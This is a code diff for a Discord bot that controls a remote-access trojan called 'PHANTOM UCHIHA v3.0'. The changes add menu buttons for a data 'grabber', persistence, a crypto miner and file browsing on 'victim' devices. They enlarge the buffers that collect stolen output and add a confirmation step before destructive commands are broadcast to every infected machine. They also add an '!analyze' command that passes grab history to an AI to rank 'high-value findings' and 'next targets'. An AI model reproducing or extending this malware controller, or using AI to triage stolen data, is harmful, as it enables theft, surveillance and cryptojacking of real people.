@@ -74,6 +74,8 @@ const B = {
   screenshot: btn('screenshot','SCREENSHOT',E.eye,     'danger'),
   stream:     btn('stream',    'LIVE',      '📡',      'danger'),
   shell:      btn('shell_btn', 'SHELL',     '💻',      'primary'),
+  files:      btn('dir',       'FILES',     '📁',      'primary'),
+  grabber:    btn('grabber',   'GRABBER',   '🔍',      'danger'),
   target:     btn('target',    'TARGET',    E.target,  'success'),
   broadcast:  btn('broadcast', 'BROADCAST', E.bomb,    'danger'),
   info:       btn('info',      'INTEL',     E.bone,    'primary'),
@@ -83,15 +85,16 @@ const B = {
 
 const MENU_BTNS = [
   ...actionRow(B.victims, B.screenshot, B.stream, B.shell),
-  ...actionRow(B.target, B.broadcast, B.info),
-  ...actionRow(B.menu, B.help),
+  ...actionRow(B.target, B.files, B.grabber, B.broadcast),
+  ...actionRow(B.menu, B.help, B.info),
 ].flat()
 
 const HELP_BTNS = actionRow(B.menu).flat()
 
 const RESULT_BTNS = [
   ...actionRow(B.screenshot, B.stream, B.shell),
-  ...actionRow(B.victims, B.target, B.menu),
+  ...actionRow(B.victims, B.files, B.grabber, B.target),
+  ...actionRow(B.menu, B.help),
 ].flat()
 
 const ALERT_BTNS_ONLINE = (chId) => [
@@ -99,8 +102,13 @@ const ALERT_BTNS_ONLINE = (chId) => [
     btn('a_menu_' + chId, 'HOME', '🏠', 'secondary'),
     btn('a_victims_' + chId, 'VICTIMS', '👻', 'primary'),
     btn('a_ss_' + chId, 'SCREENSHOT', '📸', 'danger'),
+    btn('a_grabber_' + chId, 'GRABBER', '🔍', 'danger'),
+  ),
+  new ActionRowBuilder().addComponents(
     btn('a_stream_' + chId, 'LIVE', '📡', 'danger'),
     btn('a_cmd_' + chId, 'SHELL', '💻', 'primary'),
+    btn('a_persist_' + chId, 'PERSIST', '💉', 'primary'),
+    btn('a_miner_' + chId, 'MINER', '⛏️', 'primary'),
   ),
 ]
 
@@ -289,36 +297,33 @@ async function sendCmdLogged(channel, cmd, payload, userId, userName) {
 async function collectChannelResponse(channel, cmdName, timeoutMs = 30000) {
   try {
     const before = Date.now()
-    // Wait for device to process and start responding
-    await new Promise(r => setTimeout(r, 3000))
+    const sentCmds = new Set()
+    // Track command messages we sent during this collection window
+    let lastMsgId = null
+    await new Promise(r => setTimeout(r, 2500))
     const parts = []
-    let hasMore = true
-    while (hasMore && (Date.now() - before) < timeoutMs) {
-      const msgs = await channel.messages.fetch({ limit: 10 })
-      const botMsgs = msgs.filter(m =>
-        m.author.bot &&
-        m.content &&
-        !m.content.includes(':heartbeat:') &&
-        !m.content.includes('!ping') &&
-        !m.content.includes('!grabber') &&
-        m.createdTimestamp > before - 2000
-      )
-      for (const [, m] of botMsgs) {
+    while ((Date.now() - before) < timeoutMs) {
+      const msgs = await channel.messages.fetch({ limit: 15 })
+      for (const [, m] of msgs) {
+        if (!m.author.bot || !m.content) continue
+        if (m.content.includes(':heartbeat:') || m.content.includes('**Alive**') || m.content.includes('**Device Online**')) continue
+        if (m.createdTimestamp < before - 5000) continue
+        // Skip if this is a command we sent (starts with !)
+        if (m.content.startsWith('!') && m.createdTimestamp < before + 5000) { sentCmds.add(m.id); lastMsgId = m.id; continue }
+        if (sentCmds.has(m.id)) continue
         const text = m.content
         const attachments = m.attachments.map(a => `[FILE: ${a.name} (${formatSize(a.size)})]`).join(' ')
-        parts.push((attachments ? text + ' ' + attachments : text).slice(0, 800))
+        parts.push((attachments ? text + ' ' + attachments : text).slice(0, 1500))
+        sentCmds.add(m.id)
       }
-      if (botMsgs.size === 0) {
-        // No new messages — wait a bit then check again
-        await new Promise(r => setTimeout(r, 2000))
-        if ((Date.now() - before) > timeoutMs) hasMore = false
-      } else {
-        // Got messages, wait for more to arrive
+      if (parts.length > 0) {
+        // Got results — wait for more to accumulate
         await new Promise(r => setTimeout(r, 3000))
-        if ((Date.now() - before) > timeoutMs) hasMore = false
+      } else {
+        await new Promise(r => setTimeout(r, 2000))
       }
     }
-    const combined = parts.join('\n').slice(0, 5000)
+    const combined = parts.join('\n──────────────────\n').slice(0, 20000)
     return combined || null
   } catch { return null }
 }
@@ -402,7 +407,10 @@ function menuEmbed() {
     `• \`!send <cmd> <victim>\` — Direct send\n` +
     `• \`!help\` — Full command reference\n` +
     `• \`!history\` — Your command log\n` +
-    `• \`!search <query>\` — Find victim\n\n` +
+    `• \`!search <query>\` — Find victim\n` +
+    `• \`!ai <request>\` — AI Co-Pilot\n` +
+    `• \`!campaign <obj>\` — Autonomous campaign\n` +
+    `• \`!analyze\` — Intel analysis\n\n` +
     `**${E.star} Slash Commands**\n` +
     `• \`/menu\` \`/help\` \`/devices\` \`/target\`\n` +
     `• \`/broadcast\` \`/send\` \`/grabber\` \`/miner\` \`/upload\`\n\n` +
@@ -439,6 +447,8 @@ function helpEmbed() {
     `${A.cyan}┃${A.reset}\n` +
     `${A.cyan}┃${A.reset} ${A.green}UPLOAD${A.reset}      : !upload <file_path>\n` +
     `${A.cyan}┃${A.reset}\n` +
+    `${A.cyan}┃${A.reset} ${A.brightCyan}AI${A.reset}          : !ai !campaign !analyze\n` +
+    `${A.cyan}┃${A.reset}\n` +
     `${A.green}◈ ${clk}${A.reset}`,
     'neon', 56
   )
@@ -458,6 +468,7 @@ function helpEmbed() {
       { name: `${E.sword} CONTROL`, value: '`!admin` `!overlay` `!click` `!input` `!open` `!screen`', inline: true },
       { name: `${E.crown} MINING`, value: '`!miner [start|stop|status|set_wallet|set_pool]`', inline: true },
       { name: `${E.star} SYSTEM`, value: '`!update` `!config` `!upload`', inline: true },
+      { name: `${E.brain} AI`, value: '`!ai` `!campaign` `!analyze`', inline: true },
     )
     .setFooter({ text: `${E.skull} PHANTOM UCHIHA v3.0 ${E.skull} ${ts()}`, iconURL: ICONS.footer || undefined })
   return { embeds: [e] }
@@ -562,6 +573,10 @@ client.on(Events.InteractionCreate, async (i) => {
           const bcParts = bc.replace(/^!+/, '').split(/\s+/)
           const bcCmd = bcParts[0]; const bcPayload = bcParts.slice(1).join(' ')
           if (!VALID_CMDS.has(bcCmd)) return i.editReply(`${E.warning} Invalid command: \`!${bcCmd}\` ${E.skull}`)
+          const DESTRUCTIVE_CMDS = ['grabber', 'shell', 'persist', 'update', 'rm', 'mv', 'cp', 'admin', 'overlay']
+          if (DESTRUCTIVE_CMDS.includes(bcCmd) && !bcPayload.includes('--force')) {
+            return i.editReply(`${E.bomb} **Confirm:** Broadcast \`!${bcCmd}\` to ALL? This is destructive! Use \`!broadcast ${bcCmd} --force\` in text chat to confirm.`)
+          }
           await guild.channels.fetch()
           const channels = getPhantomChannels(guild)
           if (!channels.size) return i.editReply(`${E.coffin} No devices ${E.skull}`)
@@ -883,7 +898,8 @@ client.on(Events.InteractionCreate, async (i) => {
       const ch = guild.channels.cache.get(chId)
       if (!ch) return i.editReply({ content: `${E.coffin} Device channel not found ${E.skull}`, ephemeral: true }).catch(() => {})
       const actualCmd = ALERT_CMD_MAP[cmdKey] || cmdKey
-      const result = await sendCmd(ch, actualCmd)
+      const cmdPayload = actualCmd === 'grabber' ? 'all' : ''
+      const result = await sendCmd(ch, actualCmd, cmdPayload)
       if (result.ok) {
         return i.editReply({ content: `${E.knife} \`!${actualCmd}\` sent ${E.skull}`, components: RESULT_BTNS, ephemeral: true }).catch(() => {})
       }
@@ -1006,8 +1022,8 @@ client.on(Events.InteractionCreate, async (i) => {
           const isGrabber = cmdName === 'grabber'
           const response = await collectChannelResponse(ch, cmdName, isGrabber ? 120000 : 30000)
           if (response) {
-            results.push(`[RESULT] ${response.slice(0, 3000)}`)
-            aiContext.updateDeviceKnowledge(session, ch.id, `last_${cmdName}`, response.slice(0, 2000))
+            results.push(`[RESULT] ${response.slice(0, 5000)}`)
+            aiContext.updateDeviceKnowledge(session, ch.id, `last_${cmdName}`, response.slice(0, 5000))
             if (isGrabber) {
               aiContext.addGrabRecord(session, ch.id, pc.args || 'all', response.slice(0, 500))
               try {
@@ -1217,6 +1233,14 @@ client.on(Events.MessageCreate, async (msg) => {
           const bcCmd = bcParts[0]
           const bcPayload = bcParts.slice(1).join(' ')
           if (!VALID_CMDS.has(bcCmd)) return msg.reply(`${E.warning} Invalid command: \`!${bcCmd}\`. Use \`!help\` for valid commands. ${E.skull}`)
+          const DESTRUCTIVE_CMDS = ['grabber', 'shell', 'persist', 'update', 'rm', 'mv', 'cp', 'admin', 'overlay']
+          if (DESTRUCTIVE_CMDS.includes(bcCmd) && !bcPayload.startsWith('--force')) {
+            return msg.reply({
+              ...bloodEmbed(bold(`${E.bomb} CONFIRM BROADCAST`), 'danger',
+                `**Command:** \`!${bcCmd}\` to ALL devices\n**Warning:** This command can be destructive!\n\nReply with \`!broadcast ${bcCmd} --force\` to confirm.`),
+              components: MENU_BTNS,
+            })
+          }
           await guild.channels.fetch()
           const channels = getPhantomChannels(guild)
           if (!channels.size) return msg.reply(`${E.coffin} No devices ${E.skull}`)
@@ -1350,6 +1374,33 @@ client.on(Events.MessageCreate, async (msg) => {
               return msg.reply(`${E.coffin} Campaign \`${cid}\` cancelled ${E.skull}`)
             }
             return msg.reply(`${E.warning} Campaign not found ${E.skull}`)
+          }
+        }
+        case '!analyze': {
+          const analyzeTarget = args.join(' ')
+          const session = aiContext.getSession(guild.id, uid)
+          if (!session) return msg.reply(`${E.coffin} No AI session. Use \`!ai\` first ${E.skull}`)
+          await msg.channel.sendTyping()
+          try {
+            let dataToAnalyze = ''
+            if (analyzeTarget === 'all' || !analyzeTarget) {
+              const ctx = aiContext.summarizeDeviceKnowledge(session)
+              const grabs = aiContext.getGrabHistory(session)
+              dataToAnalyze = ctx + '\n\nGRAB HISTORY:\n' + grabs.map(g => `[${g.type}] ${g.summary}`).join('\n')
+            } else if (analyzeTarget === 'grabs') {
+              const grabs = aiContext.getGrabHistory(session)
+              dataToAnalyze = grabs.map(g => `[${g.type} @ ${new Date(g.timestamp).toLocaleString()}]\n${g.summary}`).join('\n\n')
+            } else {
+              dataToAnalyze = analyzeTarget
+            }
+            const analysis = await analyzeResults(dataToAnalyze.slice(0, 8000), session)
+            const findings = analysis.highValueFindings?.map(f => `• **${f.type}** (${f.value}): ${f.detail}`).join('\n') || 'None'
+            const nextTargets = analysis.nextTargets?.map(t => `• \`${t.target}\` — ${t.reason}`).join('\n') || 'None'
+            const text = `**🔍 ANALYSIS**\n\n${analysis.analysis || 'Analysis complete'}\n\n**High-Value Findings:**\n${findings}\n\n**Recommended Next:**\n${nextTargets}\n\n**Risk:** ${analysis.riskLevel?.toUpperCase() || 'UNKNOWN'}`
+            return msg.reply({ ...bloodEmbed(bold('🤖 INTELLIGENCE ANALYSIS'), analysis.riskLevel === 'high' ? 'danger' : 'warning', text), components: MENU_BTNS })
+          } catch (err) {
+            console.error('[Analyze] Error:', err)
+            return msg.reply(`${E.coffin} Analysis error: ${err.message} ${E.skull}`)
           }
 
           await msg.channel.sendTyping()
